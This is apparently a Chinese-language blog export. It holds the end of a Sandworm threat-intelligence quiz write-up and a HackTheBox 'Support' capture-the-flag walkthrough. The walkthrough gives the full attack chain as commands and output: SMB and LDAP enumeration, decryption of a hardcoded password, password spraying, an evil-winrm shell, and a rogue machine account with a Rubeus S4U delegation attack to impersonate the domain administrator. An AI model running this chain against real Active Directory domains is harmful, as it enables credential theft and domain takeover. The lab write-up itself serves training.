malware?众所周知，沙虫团队在其活动中使用不同的工具。 这种恶意软件的名称是什么？直接在sandworm team的主介绍页找吧Answer:NotPetya Task11What was the Microsoft security bulletin ID for the vulnerability that the malware from question 10 used to spread around the world?问微软的公告id是多少，直接Google一下盲目Google展示Google——&gt; NotPetya malware microsoft security report ——&gt;Advanced Threat Analytics security research network technical analysis: NotPetya ——&gt; click Windows Security Blog 精确Google展示：Google ——&gt; using the SMBv1 exploits EternalBlue and EternalRomance microsoft security blog Task12What is the name of the malware/tool used by the group to target modems?问攻击调制解压器的tool，直接检索一下modemAnswer:AcidRain Task13Threat Actors also use non-standard ports across their infrastructure for Operational-Security purposes. On which port did the Sandworm team reportedly establish their SSH server for listening?问sshserver端口，直接检索一下 Task14The Sandworm Team has been assisted by another APT group on various operations. Which specific group is known to have collaborated with them?问和他们合作的APT组织是哪个在刚刚的检索过程我们可以看到另一个名字：APT44但是APT44其实是对SandWorm的另一个称呼，真正与其合作的是APT28Answer:28","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://example.com/tags/writeup/"}]},{"title":"HackTheBox——HTB Support Writeup","slug":"HackTheBox——HTB Support Writeup/HackTheBox——HTB Support Writeup","date":"2025-06-19T13:59:05.067Z","updated":"2025-06-19T13:59:05.067Z","comments":true,"path":"2025/06/19/HackTheBox——HTB Support Writeup/HackTheBox——HTB Support Writeup/","permalink":"http://example.com/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/","excerpt":"","text":"Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习 nmap and other enumnmap12345678910111213141516171819202122232425262728293031PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp open mc-nmf .NET Message Framing49664/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049701/tcp open msrpc Microsoft Windows RPC49735/tcp open msrpc Microsoft Windows RPCService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required| smb2-time: | date: 2025-04-03T02:17:55|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 103.34 seconds 先加一下hosts smb12345678910111213$ nxc smb 10.10.11.174 -u guest -p &#x27;&#x27; --sharesSMB 10.10.11.174 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) SMB 10.10.11.174 445 DC [+] support.htb\\guest: SMB 10.10.11.174 445 DC [*] Enumerated sharesSMB 10.10.11.174 445 DC Share Permissions RemarkSMB 10.10.11.174 445 DC ----- ----------- ------SMB 10.10.11.174 445 DC ADMIN$ Remote AdminSMB 10.10.11.174 445 DC C$ Default shareSMB 10.10.11.174 445 DC IPC$ READ Remote IPCSMB 10.10.11.174 445 DC NETLOGON Logon server share SMB 10.10.11.174 445 DC support-tools READ support staff toolsSMB 10.10.11.174 445 DC SYSVOL Logon server share 有一个support-tools的共享目录，进去翻一下 12345678910111213141516$ smbclient \\\\\\\\10.10.11.174\\\\support-tools -U guestPassword for [WORKGROUP\\guest]:Try &quot;help&quot; to get a list of possible commands.smb: \\&gt; ls . D 0 Thu Jul 21 01:01:06 2022 .. D 0 Sat May 28 19:18:25 2022 7-ZipPortable_21.07.paf.exe A 2880728 Sat May 28 19:19:19 2022 npp.8.4.1.portable.x64.zip A 5439245 Sat May 28 19:19:55 2022 putty.exe A 1273576 Sat May 28 19:20:06 2022 SysinternalsSuite.zip A 48102161 Sat May 28 19:19:31 2022 UserInfo.exe.zip A 277499 Thu Jul 21 01:01:07 2022 windirstat1_1_2_setup.exe A 79171 Sat May 28 19:20:17 2022 WiresharkPortable64_3.6.5.paf.exe A 44398000 Sat May 28 19:19:43 2022 4026367 blocks of size 4096. 965578 blocks available 啊这，几个都翻一下吧 123456789101112131415161718192021$ smbclient \\\\\\\\10.10.11.174\\\\IPC$ -U guest Password for [WORKGROUP\\guest]:Try &quot;help&quot; to get a list of possible commands.smb: \\&gt; lsNT_STATUS_NO_SUCH_FILE listing \\*smb: \\&gt; exit$ smbclient \\\\\\\\10.10.11.174\\\\NETLOGON -U guestPassword for [WORKGROUP\\guest]:Try &quot;help&quot; to get a list of possible commands.smb: \\&gt; lsNT_STATUS_ACCESS_DENIED listing \\*smb: \\&gt; exit$ smbclient \\\\\\\\10.10.11.174\\\\SYSVOL -U guestPassword for [WORKGROUP\\guest]:Try &quot;help&quot; to get a list of possible commands.smb: \\&gt; lsNT_STATUS_ACCESS_DENIED listing \\*smb: \\&gt; 好吧，还是把tools先下载下来看看 1234567891011121314151617181920212223242526$ smbclient \\\\\\\\10.10.11.174\\\\support-tools -U guestPassword for [WORKGROUP\\guest]:Try &quot;help&quot; to get a list of possible commands.smb: \\&gt; ls . D 0 Thu Jul 21 01:01:06 2022 .. D 0 Sat May 28 19:18:25 2022 7-ZipPortable_21.07.paf.exe A 2880728 Sat May 28 19:19:19 2022 npp.8.4.1.portable.x64.zip A 5439245 Sat May 28 19:19:55 2022 putty.exe A 1273576 Sat May 28 19:20:06 2022 SysinternalsSuite.zip A 48102161 Sat May 28 19:19:31 2022 UserInfo.exe.zip A 277499 Thu Jul 21 01:01:07 2022 windirstat1_1_2_setup.exe A 79171 Sat May 28 19:20:17 2022 WiresharkPortable64_3.6.5.paf.exe A 44398000 Sat May 28 19:19:43 2022 4026367 blocks of size 4096. 965578 blocks availablesmb: \\&gt; promptsmb: \\&gt; mget *getting file \\7-ZipPortable_21.07.paf.exe of size 2880728 as 7-ZipPortable_21.07.paf.exe (676.7 KiloBytes/sec) (average 676.7 KiloBytes/sec)getting file \\npp.8.4.1.portable.x64.zip of size 5439245 as npp.8.4.1.portable.x64.zip (1247.5 KiloBytes/sec) (average 965.5 KiloBytes/sec)getting file \\putty.exe of size 1273576 as putty.exe (717.7 KiloBytes/sec) (average 923.2 KiloBytes/sec)getting file \\SysinternalsSuite.zip of size 48102161 as SysinternalsSuite.zip (1783.5 KiloBytes/sec) (average 1544.2 KiloBytes/sec)getting file \\UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (341.7 KiloBytes/sec) (average 1518.6 KiloBytes/sec)getting file \\windirstat1_1_2_setup.exe of size 79171 as windirstat1_1_2_setup.exe (106.5 KiloBytes/sec) (average 1491.7 KiloBytes/sec)getting file \\WiresharkPortable64_3.6.5.paf.exe of size 44398000 as WiresharkPortable64_3.6.5.paf.exe (2690.8 KiloBytes/sec) (average 1848.7 KiloBytes/sec)smb: \\&gt; exit 这几个文件除了userinfo的那个文件不知道是啥，其他的都可以找到出处 12$ file UserInfo.exe UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections dnspy analyst exe and crack encrypt pass with chatgptdnspy看一下在stackoverflow上翻到一个dnspy的代替品_ILSpy好吧，还是回归dnspy 123456#如果只把exe文件拿出来运行的话会报错，需要将其他的dll和config文件也放进去才可以正常运行PS C:\\Users\\liw\\desktop&gt; .\\UserInfo.exe未经处理的异常: System.IO.FileNotFoundException: 未能加载文件或程序集“CommandLineParser, Version=0.7.0.0, Culture=neutral, PublicKeyToken=null”或它的某一个依赖项。系统找不到指定的文件。 在 UserInfo.Program.Main(String[] args) 在 UserInfo.Program.&lt;Main&gt;(String[] args) dnspy打开可以看到这里找到一个password 123456789101112131415161718192021222324252627using System;using System.Text;namespace UserInfo.Services&#123; // Token: 0x02000006 RID: 6 internal class Protected &#123; // Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318 public static string getPassword() &#123; byte[] array = Convert.FromBase64String(Protected.enc_password); byte[] array2 = array; for (int i = 0; i &lt; array.Length; i++) &#123; array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223); &#125; return Encoding.Default.GetString(array2); &#125; // Token: 0x04000005 RID: 5 private static string enc_password = &quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&quot;; // Token: 0x04000006 RID: 6 private static byte[] key = Encoding.ASCII.GetBytes(&quot;armando&quot;); &#125;&#125; 这个我会吗。不会，哈哈哈，给gpt吧 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778这个 Protected 类的作用是对一个加密的密码进行解密并返回明文密码。下面是代码的详细解析：1. 代码结构这个类是 internal，意味着它只能在 UserInfo.Services 命名空间内部使用。getPassword() 方法是 static 的，意味着可以直接通过类名调用，不需要实例化对象。2. 关键逻辑：Base64 解码csharp复制编辑byte[] array = Convert.FromBase64String(Protected.enc_password);Protected.enc_password 是一个 Base64 编码 的字符串，代表一个已加密的密码。Convert.FromBase64String(...) 方法会将其解码成字节数组 array，即加密后的字节数据。3. 进行解密csharp复制编辑byte[] array2 = array;for (int i = 0; i &lt; array.Length; i++)&#123; array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);&#125;解密步骤Protected.key 是一个字节数组，由字符串 &quot;armando&quot; 转换成 ASCII 编码字节数组：csharp复制编辑private static byte[] key = Encoding.ASCII.GetBytes(&quot;armando&quot;);也就是说，key 其实是：plaintext复制编辑[97, 114, 109, 97, 110, 100, 111] // &quot;armando&quot; 的 ASCII 码遍历 array，对每个字节执行 异或运算（XOR）：csharp复制编辑array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);array[i] 是加密的字节。Protected.key[i % Protected.key.Length] 通过取模操作，循环使用 &quot;armando&quot; 的字节。223 是额外的一个固定数值（类似于盐值），增加混淆难度。最后，把解密后的字节数组转换回字符串：csharp复制编辑return Encoding.Default.GetString(array2);这就是原始的密码。当然！我会用 C# 的逻辑来解密 enc_password，但我会在 Python 里实现它，这样我们可以直接运行并得到结果。解密逻辑Base64 解码 enc_password，得到加密的字节数组。XOR 逐字节解密：使用 &quot;armando&quot; 作为密钥。每个字节先与 key[i % key.Length] 进行异或，再与 223 进行异或。转换回字符串，得到明文密码。我现在来运行这个解密代码。解密后的密码是：nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz如果这是你的真实密码，请确保它的安全，不要在公共场合泄露！如果你有其他需要，比如加密方式的优化或者更安全的存储方法，也可以告诉我 😊 ​ 附上gpt写的解密py 1234567891011121314151617181920import base64# 加密的 Base64 密文enc_password = &quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&quot;# 解密密钥key = &quot;armando&quot;.encode(&quot;ascii&quot;)# 1. Base64 解码encrypted_bytes = base64.b64decode(enc_password)# 2. XOR 解密decrypted_bytes = bytearray(len(encrypted_bytes))for i in range(len(encrypted_bytes)): decrypted_bytes[i] = encrypted_bytes[i] ^ key[i % len(key)] ^ 223# 3. 转换回字符串decrypted_password = decrypted_bytes.decode(&quot;utf-8&quot;, errors=&quot;ignore&quot;)decrypted_password 在上面还可以看到认证方式 1234string password = Protected.getPassword(); this.entry = new DirectoryEntry(&quot;LDAP://support.htb&quot;, &quot;support\\\\ldap&quot;, password); this.entry.AuthenticationType = AuthenticationTypes.Secure; this.ds = new DirectorySearcher(this.entry); ldap enum info尝试一下我们的密码 1234$ nxc ldap 10.10.11.174 -u ldap -p &#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27;LDAP 10.10.11.174 389 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)LDAP 10.10.11.174 389 DC [+] support.htb\\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 有效翻一下ldap吧 12345678910111213141516171819202122232425262728293031323334$ ldapsearch -H &#x27;ldap://10.10.11.174&#x27; -D ldap@support.htb -w &#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27; -b &quot;DC=support,DC=htb&quot; | less# /搜索一下info信息，可以看到有意思的# support, Users, support.htbdn: CN=support,CN=Users,DC=support,DC=htbobjectClass: topobjectClass: personobjectClass: organizationalPersonobjectClass: usercn: supportc: USl: Chapel Hillst: NCpostalCode: 27514distinguishedName: CN=support,CN=Users,DC=support,DC=htbinstanceType: 4whenCreated: 20220528111200.0ZwhenChanged: 20220528111201.0ZuSNCreated: 12617info: Ironside47pleasure40WatchfulmemberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htbmemberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htbuSNChanged: 12630company: supportstreetAddress: Skipper Bowles Drname: supportobjectGUID:: CqM5MfoxMEWepIBTs5an8Q==userAccountControl: 66048badPwdCount: 0codePage: 0countryCode: 0badPasswordTime: 0lastLogoff: 0lastLogon: 0 长得真像个密码，先留一下枚举一下用户名 1234567891011121314151617181920212223242526$ nxc ldap 10.10.11.174 -u ldap -p &#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27; --usersLDAP 10.10.11.174 389 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)LDAP 10.10.11.174 389 DC [+] support.htb\\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz LDAP 10.10.11.174 389 DC [*] Enumerated 20 domain users: support.htbLDAP 10.10.11.174 389 DC -Username- -Last PW Set- -BadPW- -Description- LDAP 10.10.11.174 389 DC Administrator 2022-07-20 01:55:56 0 Built-in account for administering the computer/domain LDAP 10.10.11.174 389 DC Guest 2022-05-28 19:18:55 0 Built-in account for guest access to the computer/domain LDAP 10.10.11.174 389 DC krbtgt 2022-05-28 19:03:43 0 Key Distribution Center Service Account LDAP 10.10.11.174 389 DC ldap 2022-05-28 19:11:46 0 LDAP 10.10.11.174 389 DC support 2022-05-28 19:12:00 0 LDAP 10.10.11.174 389 DC smith.rosario 2022-05-28 19:12:19 0 LDAP 10.10.11.174 389 DC hernandez.stanley 2022-05-28 19:12:34 0 LDAP 10.10.11.174 389 DC wilson.shelby 2022-05-28 19:12:50 0 LDAP 10.10.11.174 389 DC anderson.damian 2022-05-28 19:13:05 0 LDAP 10.10.11.174 389 DC thomas.raphael 2022-05-28 19:13:21 0 LDAP 10.10.11.174 389 DC levine.leopoldo 2022-05-28 19:13:37 0 LDAP 10.10.11.174 389 DC raven.clifton 2022-05-28 19:13:53 0 LDAP 10.10.11.174 389 DC bardot.mary 2022-05-28 19:14:08 0 LDAP 10.10.11.174 389 DC cromwell.gerard 2022-05-28 19:14:24 0 LDAP 10.10.11.174 389 DC monroe.david 2022-05-28 19:14:39 0 LDAP 10.10.11.174 389 DC west.laura 2022-05-28 19:14:55 0 LDAP 10.10.11.174 389 DC langley.lucy 2022-05-28 19:15:10 0 LDAP 10.10.11.174 389 DC daughtler.mabel 2022-05-28 19:15:26 0 LDAP 10.10.11.174 389 DC stoll.rachelle 2022-05-28 19:15:42 0 LDAP 10.10.11.174 389 DC ford.victoria 2022-05-28 19:15:58 0 再尝试一下smb，可以的话遛狗 1234567891011121314151617181920212223$ nxc smb 10.10.11.174 -u ldap -p &#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27; SMB 10.10.11.174 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) SMB 10.10.11.174 445 DC [+] support.htb\\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz $ bloodhound-python -d support.htb -u ldap -p &#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27; -ns 10.10.11.174 --zip INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)INFO: Found AD domain: support.htbINFO: Getting TGT for userWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.support.htb:88)] [Errno -2] Name or service not knownINFO: Connecting to LDAP server: dc.support.htbINFO: Found 1 domainsINFO: Found 1 domains in the forestINFO: Found 2 computersINFO: Found 21 usersINFO: Connecting to LDAP server: dc.support.htbINFO: Found 53 groupsINFO: Found 0 trustsINFO: Starting computer enumeration with 10 workersINFO: Querying computer: Management.support.htbINFO: Querying computer: dc.support.htbINFO: Done in 00M 46SINFO: Compressing output into 20250403145630_bloodhound.zip 导入到bloodhound里面（我导入到了bloodhoundCE里面，但是不知道为啥导入进去很慢，有时间看一下是什么问题，哦，nxc也可以直接–bloodhound） 这边把枚举出来的用户名导出来喷射一下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647$ nxc ldap 10.10.11.174 -u ldap -p &#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27; --users | grep 2022- | awk -F &#x27; &#x27; &#x27;&#123;print $5&#125;&#x27; | tee &gt; user.list$ cat user.list AdministratorGuestkrbtgtldapsupportsmith.rosariohernandez.stanleywilson.shelbyanderson.damianthomas.raphaellevine.leopoldoraven.cliftonbardot.marycromwell.gerardmonroe.davidwest.lauralangley.lucydaughtler.mabelstoll.rachelleford.victoria$ nxc smb 10.10.11.174 -u user.list -p &#x27;Ironside47pleasure40Watchful&#x27; --continue-on-successSMB 10.10.11.174 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) SMB 10.10.11.174 445 DC [-] support.htb\\Administrator:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE SMB 10.10.11.174 445 DC [-] support.htb\\Guest:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE SMB 10.10.11.174 445 DC [-] support.htb\\krbtgt:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE SMB 10.10.11.174 445 DC [-] support.htb\\ldap:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE SMB 10.10.11.174 445 DC [+] support.htb\\support:Ironside47pleasure40Watchful SMB 10.10.11.174 445 DC [-] support.htb\\smith.rosario:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE SMB 10.10.11.174 445 DC [-] support.htb\\hernandez.stanley:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE SMB 10.10.11.174 445 DC [-] support.htb\\wilson.shelby:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE SMB 10.10.11.174 445 DC [-] support.htb\\anderson.damian:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE SMB 10.10.11.174 445 DC [-] support.htb\\thomas.raphael:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE SMB 10.10.11.174 445 DC [-] support.htb\\levine.leopoldo:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE SMB 10.10.11.174 445 DC [-] support.htb\\raven.clifton:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE SMB 10.10.11.174 445 DC [-] support.htb\\bardot.mary:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE SMB 10.10.11.174 445 DC [-] support.htb\\cromwell.gerard:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE SMB 10.10.11.174 445 DC [-] support.htb\\monroe.david:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE SMB 10.10.11.174 445 DC [-] support.htb\\west.laura:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE SMB 10.10.11.174 445 DC [-] support.htb\\langley.lucy:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE SMB 10.10.11.174 445 DC [-] support.htb\\daughtler.mabel:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE SMB 10.10.11.174 445 DC [-] support.htb\\stoll.rachelle:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE SMB 10.10.11.174 445 DC [-] support.htb\\ford.victoria:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 这里用nxc winrm看support是失败的（我猜是权限问题）在bloodhound里面可以看到support是remote management users的组成员直接登录一下试试 1234567891011$ sudo evil-winrm -i 10.10.11.174 -u support -p &#x27;Ironside47pleasure40Watchful&#x27; Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\support\\Documents&gt; shell as support在上面的图片中我们还可以看到support用户还在shared support account组里面而从这个组到administrator有一条清晰的路线就按照人家的来吧 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259*Evil-WinRM* PS C:\\Users\\support&gt; mkdir C:\\lusowen Directory: C:\\ Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 4/3/2025 1:06 AM lusowen *Evil-WinRM* PS C:\\Users\\support&gt; cd C:\\lusowen *Evil-WinRM* PS C:\\lusowen&gt; upload PowerView.ps1 Info: Uploading /home/lusowen/HackTheBox/Support/PowerView.ps1 to C:\\lusowen\\PowerView.ps1 Data: 1027036 bytes of 1027036 bytes copied Info: Upload successful! *Evil-WinRM* PS C:\\lusowen&gt; . .\\PowerView.ps1*Evil-WinRM* PS C:\\lusowen&gt; upload Powermad.ps1 Info: Uploading /home/lusowen/HackTheBox/Support/Powermad.ps1 to C:\\lusowen\\Powermad.ps1 Data: 180768 bytes of 180768 bytes copied Info: Upload successful! *Evil-WinRM* PS C:\\lusowen&gt; . .\\Powermad.ps1*Evil-WinRM* PS C:\\lusowen&gt; New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString &#x27;Summer2018!&#x27; -AsPlainText -Force)[+] Machine account attackersystem added*Evil-WinRM* PS C:\\lusowen&gt; upload Rubeus.exe Info: Uploading /home/lusowen/HackTheBox/Support/Rubeus.exe to C:\\lusowen\\Rubeus.exe Data: 595968 bytes of 595968 bytes copied Info: Upload successful!*Evil-WinRM* PS C:\\lusowen&gt; $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid*Evil-WinRM* PS C:\\lusowen&gt; $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))&quot; *Evil-WinRM* PS C:\\lusowen&gt; $SDBytes = New-Object byte[] ($SD.BinaryLength) *Evil-WinRM* PS C:\\lusowen&gt; $SD.GetBinaryForm($SDBytes, 0)*Evil-WinRM* PS C:\\lusowen&gt; Get-DomainComputer $TargetComputer | Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125;Warning: [Set-DomainObject] Error setting/replacing properties for object &#x27;MANAGEMENT$&#x27; : Exception calling &quot;CommitChanges&quot; with &quot;0&quot; argument(s): &quot;Access is denied.&quot; *Evil-WinRM* PS C:\\lusowen&gt; .\\Rubeus.exe hash /password:Summer2018! ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.2.0[*] Action: Calculate Password Hash(es)[*] Input password : Summer2018![*] rc4_hmac : EF266C6B963C0BB683941032008AD47F[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!*Evil-WinRM* PS C:\\lusowen&gt; .\\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.2.0[*] Action: S4U[*] Using rc4_hmac hash: EF266C6B963C0BB683941032008AD47F [*] Building AS-REQ (w/ preauth) for: &#x27;support.htb\\attackersystem$&#x27;[*] Using domain controller: ::1:88[+] TGT request successful![*] base64(ticket.kirbi): doIFojCCBZ6gAwIBBaEDAgEWooIEszCCBK9hggSrMIIEp6ADAgEFoQ0bC1NVUFBPUlQuSFRCoiAwHqAD AgECoRcwFRsGa3JidGd0GwtzdXBwb3J0Lmh0YqOCBG0wggRpoAMCARKhAwIBAqKCBFsEggRXEiL6BRE5 rBNoMPYjcBWUb07+3Wo1fe9i68gpTjJE4D607Hwx6xKuyvRDdkYMFb0pCsXKg2FkXOQxxlDxXlKkN8WY Aj9Fsduu600l0CV1MUicq/06o4dBax3InDJOiiFnY7e6i6wVbHucd2w6dES3bJtU2A6WCyNbeFefKV9H vGmIt54LY/kuRWHOwrRuHnkVYbqlgV2ClHvFVWRbvtWRWSWhr/SVgH8+NTl2796ZgkVlMgBBJVl/0XLI okFMhH8vxr5Cu9w31TVvmPxeTdL5MGltQrbBNRPJJU6ZYRvK3rYHqY9LDjt1/fYOXO97yksi+xtMcKFZ ox5BoKnbdLMG2fCLhHoUGOLiE/FcG4HOFpJSYyzjT1/jV4fotMKv/iMo44uXLf/m/ybChrdZtFrtUGQg 8Ac2lq7QH9qQr4/YQ1fb+dVahK0vmRrceSN6BMnPAK9x7mrXh7meX9PuRvogQxB4uggqHPPa+hvXspeF T5LN0hrf6Vy80kFCGl/037prp21idy2unELWRVNiH+yBGCw2ebbrRZWRFnAxAS9D1YdWLdwNYs+yDcSh 3qP5l7diOqAr0xAkeLFKKry0iWInk7pvopNlgiLU5tYv67SfduU5wTsCbivKVjWWq0oMBeIRYqFYTOS7 1pKzT++CHqk5pylsFdzhlIzTo7+/4thpDK7hWbXRrZ398bWbN+/xZPKZ+FmjtG2bO8d0ZmQ/RYAVD5D6 KKIY2Ayc6EMllGaoIibfpVd7sDtfZh4WwCrUI+lAT3Eq0oTy+BsQL79mU2qSWVdITMenllIMnyf4gF15 Z4bTDJGCCbqDo4W8TJt+wE/9dwdMbMn+E+dxbf3ZVvalj+as9iMszNFXzlNn118gPSRlGac4zNhSA6ys 4nDfVqhYGBLqzsKzvC9Nm0Izat53hiYUShbMvV0sorNn2BqSEU1fxrYAdg3ZGdMLBTBSLOeatRLSa1LR oWPFevv0OnyymVN2ykm4zVvwYFo6a1KzTiFepn1e1glVRr7tPofRCU3GXuYnevVr+0V0fX6kB/93CnyZ BY+jcJR9ltH0oVXHtLOR8vkRZvwRuxVdKoHJEjrsrVIag6fF4TLKOn1+yd8V5dxDu0r5BfxULMCRsoiQ Xh1Pyc2Msg1vKC/AuLltQBnLY+oPfQmqWJO2VbLpM/ClMggE8LtTFlwsITJ9RRHsLE2hXyEfmbR9WINV o73wDPfq+vcmjikRNY/Ltq3Y98X/4dBXZxncSRpzDqpZGbKvN4edy41+EU/vfnNTjyn6mWaymGMdFk4x 0gcBe9gFxctMzrxcgME6yh/h+j/E8FGV96FX4uxpwXO2Dxo7EkcWdRLuVKit9q7Xi7SlRUqRTVQB7FUa jvpL7BAgsGbEQomG4NcPgdoI2/Rz9rmTT0d0N8zKILOC5uiWZnmyUkWh7rtI4n2xS40iEhXMDtCVwefD qlXhVZkeDGGisydSzz0mxggmyZXizyESZaOB2jCB16ADAgEAooHPBIHMfYHJMIHGoIHDMIHAMIG9oBsw GaADAgEXoRIEECwibmu541scxclficDwDnmhDRsLU1VQUE9SVC5IVEKiHDAaoAMCAQGhEzARGw9hdHRh Y2tlcnN5c3RlbSSjBwMFAEDhAAClERgPMjAyNTA0MDMwODIwNTVaphEYDzIwMjUwNDAzMTgyMDU1WqcR GA8yMDI1MDQxMDA4MjA1NVqoDRsLU1VQUE9SVC5IVEKpIDAeoAMCAQKhFzAVGwZrcmJ0Z3QbC3N1cHBv cnQuaHRi[*] Action: S4U[*] Building S4U2self request for: &#x27;attackersystem$@SUPPORT.HTB&#x27;[*] Using domain controller: dc.support.htb (::1)[*] Sending S4U2self request to ::1:88[+] S4U2self success![*] Got a TGS for &#x27;administrator&#x27; to &#x27;attackersystem$@SUPPORT.HTB&#x27;[*] base64(ticket.kirbi): doIFsjCCBa6gAwIBBaEDAgEWooIEyTCCBMVhggTBMIIEvaADAgEFoQ0bC1NVUFBPUlQuSFRCohwwGqAD AgEBoRMwERsPYXR0YWNrZXJzeXN0ZW0ko4IEhzCCBIOgAwIBF6EDAgEBooIEdQSCBHGawvYEUsnLRmjq zLqXnxIBEGvIsOl15LzJzMv6FpJcMDzCfWYGjptKYPQDPYif6g6Swt8VMxsovNDNJ3yOjhVrFQ+zVfNj FOHeNMU2i0DjItQpjiIlfwdJ0md6qyJWcbrmbmyVYAYD2L7bIFi8Lpb+JGbPifEW95U9ze1kv39otMgJ B4m4CWcXMlIL7DRDIQJydeUHLY0f2aoiOsXRtinsArABTdEvq4d0Sw5wgzRMUhPqvhrlPJAaTnIAhJk8 sTW0EREOFF06hVJcjRrO3hBna6ERWiMo2o6HU49ZKl3sUuNV4U9CG7Ji0xaVsqfamWI5EdrYKOIcA0UW 